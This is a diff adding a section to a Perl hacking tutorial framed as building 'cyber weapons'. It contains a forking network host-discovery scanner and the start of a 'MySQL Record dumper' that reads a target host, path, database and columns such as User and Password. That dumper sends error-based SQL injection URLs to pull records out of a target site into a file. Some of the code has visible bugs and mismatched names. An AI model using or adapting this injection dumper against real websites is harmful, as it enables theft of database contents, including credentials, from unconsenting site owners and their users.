@@ -2012,3 +2012,180 @@ when shifting outside of function bodies those will commonly act as command line
 `ARGV      -> Argument Vectors, which is basically a variable that contains the arguments passed to a program through the command line.`
 
 `Shift     -> Sets the arrays dimension, or command line argument vector (ARGV)`
+
+> Now why do perl modules come handy in cyber security? 
+
+Perl modules or modules in any language come in handy especially in cyber security cause it makes the programmers life easy, when writing malicous code or frameworks or you just want to crack a simple hash, you can call a whole function in one line from the module, this makes it easier for hackers and programmers as a whole if you are in a hurry and dont have the time to open a whole script and program from scratch. Modules take time to build and time to understand so do classes and subroutines and functions. However in the future they become really really helpful when trying to throw soething quick and less complicated together.
+
+So this part will be making our module dedicated to cyber weapons, now since i was on the trail of web exploitation / networking, lets build our module around that 
+
+like everything we map it out, this will be something like a network recon mdoule ' IF you couldnt get the hint '
+
+our module will be dedicated to discovering hosts on a network and outputting the hosts in a table like form 
+
+**Our perl file or module file will be module.pm, and our package name will be NetworkSecurity**
+
+```pl
+# you can use your name
+Package NetworkSecurity;
+
+use strict;
+use warnings;
+use Net::Ping;
+use Net::Netmask;
+use POSIX 'WNOHANG';
+use feature 'say';
+use utf8;
+
+
+sub hostid{
+    my $netmask = Net::Netmask->new2(shift) or die Net::Netmask::errstr;
+    print "\n___COL_______HOST_________STATE____BOOL__\n";
+    for my $ip_address ($netmask->enumerate)
+    {
+    my $parent = fork();
+    unless ($parent)
+    {
+        my $sender  = Net::Ping->new(shift || 'tcp', shift || 5);
+        if ($sender->ping($ip_address))
+        {
+        if ($sender->{proto} eq 'syn')
+        {
+            exit 0 unless $sender->ack($ip_address);
+        }
+        print "Address -> $ip_address \t| Alive | TRUE  |\n";
+        }
+        exit 0;
+    }
+    }
+    until (waitpid(-1, WNOHANG) == -1) {};
+    print "-----------------------------------------\n";
+    print "Exiting\n";
+}
+
+1;
+```
+
+Not to bad to understand, we declare the packages we will use, features, and declare our package name, then we write our subroutine which calls net netmask as a argument, this will be our network CIDR we will need to add as an argument, we move down then we see the net ping, this will be the mode we will want to use, if that statement or argument called has the second argument empty it will return standard with tcp, same with the timeout shift statement except it will be a 5 second connection timeout
+
+then we parse the addresses and response from the host and output what host came back with an ack response.
+
+**in our main.pl file**
+
+```pl
+use strict;
+use warnings;
+use module;
+use Getopt::Std;
+
+# r = CIDR or net range
+# m = network mode, packet type, icmp, syn, tcp, udp etc
+getopt('r:m:', \%opts);
+
+my $target  = $opts{r};
+my $netmode = $opts{m};
+
+
+sub main{
+    NetworkRecon::hostid($target, $netmode, 6);
+}
+
+main;
+```
+
+now before running the script lets go through what the main perl file is doing, first we do the normal require the module and the libs we will use, then calling getopt with options which will be r and m, r is the CIDR we will be using to target, and m which is the network mode or the type of packet we want to send. then we pass those arguments to the main function which declare NetworkRecon, CIDR, mode, timeout and runs the main function
+
+once we push this to the INC path we can now run our main file 
+
+```pl
+sudo perl main.pl -r 10.0.0.1/24 -m icmp
+```
+
+this will produce something like this 
+
+```
+___COL_______HOST_________STATE____BOOL__
+Address -> 10.0.0.17    | Alive | TRUE  |
+Address -> 10.0.0.16    | Alive | TRUE  |
+Address -> 10.0.0.18    | Alive | TRUE  |
+Address -> 10.0.0.20    | Alive | TRUE  |
+Address -> 10.0.0.8     | Alive | TRUE  |
+Address -> 10.0.0.113   | Alive | TRUE  |
+Address -> 10.0.0.120   | Alive | TRUE  |
+Address -> 10.0.0.207   | Alive | TRUE  |
+Address -> 10.0.0.213   | Alive | TRUE  |
+-----------------------------------------
+```
+
+Now that we have solved modules, and can understand how to advance them lets move onto actuall exploitation and building well preforming cyber weapons with perl. 
+
+So lets hop back the web exploitation, to properly go into the whole web exploitation thing, we are going to make smaller examples, simply to just give you a good concept of how perl works with connections and sockets. In this next example we will program a MySQL Record dumper which will take a few arguments once you run the script as STDIN
+
+they are the following 
+
+```pl
+Host     - Ex: www.something.com
+Path     - Ex: /producs.asm?catid=
+Database - Ex: Dbnamesomething
+DB Table - Ex: table1
+```
+
+and some extra which we will get to later, all we need for this script will be the LWP module 
+
+**filename: main.pl**
+
+```pl
+use LWP::UserAgent;
+```
+
+lets declare our values 
+
+```pl
+my $ua = LWP::UserAgent->new;
+$colcount = 0;
+```
+
+the ua is the useragent which will ask LWP for a new one anf the col count is the column count 
+
+then we need to make our arguement subroutine 
+
+```pl
+sub args{
+    print "Hostname (e.g www.site.com):";$host = <STDIN>;chomp $host;
+    print "Path (e.g /products.asp?catid=):";$path = <STDIN>;chomp $path;
+    print "Database:";$db = <STDIN>;chomp $db;
+    print "Database table:";$table = <STDIN>;chomp $table;
+    print "How many columns would you like to dump:";$colnum = <STDIN>;chomp $colnum;
+    print "Column names (format: User,Password):";$colnames = <STDIN>;chomp $colnames;@cols = split(/,/, $colnames);
+    print "Records to dump (format: 1-23):";$rec = <STDIN>;chomp $rec;@recs = split (/-/, $rec);
+    $count = @recs[0];
+}
+```
+
+this is a bit messy, so lets exaplain it, first we declare the print statement, along with that print statement after the ; we declare the value we want STDIN to take in, in the one liner we use 
+
+```pl
+$host = <STDIN>; chomp $host;
+```
+
+this declares the host as a input which will be inline with the print statement, so when we run the function we will be aske for user input based on those statements, the statements stay the same until we get to column names, when we get to column names and records to dump we use some different methods, both which basically use the regex functions to split the column names and seperate them with `,`, but then append them to the column names, which is all appended to the next function we will be writing which is our get record function, the main one
+
+```pl
+sub getrecord{
+    while($colcount < $colnum){
+   
+       my $url = "http://".$host.$path."1+AND+(select+cast(CHAR(+127+)%2b+rtrim(cast((select+ISNULL(cast(".@cols[$colcount]."+as+varchar)%2c'null')+from+(select+top+1+*++from+(select+TOP+".$count."+*+from+".$db."..customers+order+by+1+desc+)+dtable+order+by+1+asc)+finaltable)+as+varchar))%2b+CHAR(+127+)+as+int))+%3d+1++Or+3%3d6";
+       my $response = $ua->get($url);
+       my $content = $response->content;
+       if($content =~ m/value(.*)to/) {
+             open (RECORDS, '>>output.txt');
+             print RECORDS $1;
+             close (RECORDS);
+       }
+       $colcount++;
+    }
+    open (RECORDS, '>>output.txt');
+    print RECORDS "$count\n";
+    close (RECORDS);
+}
+```
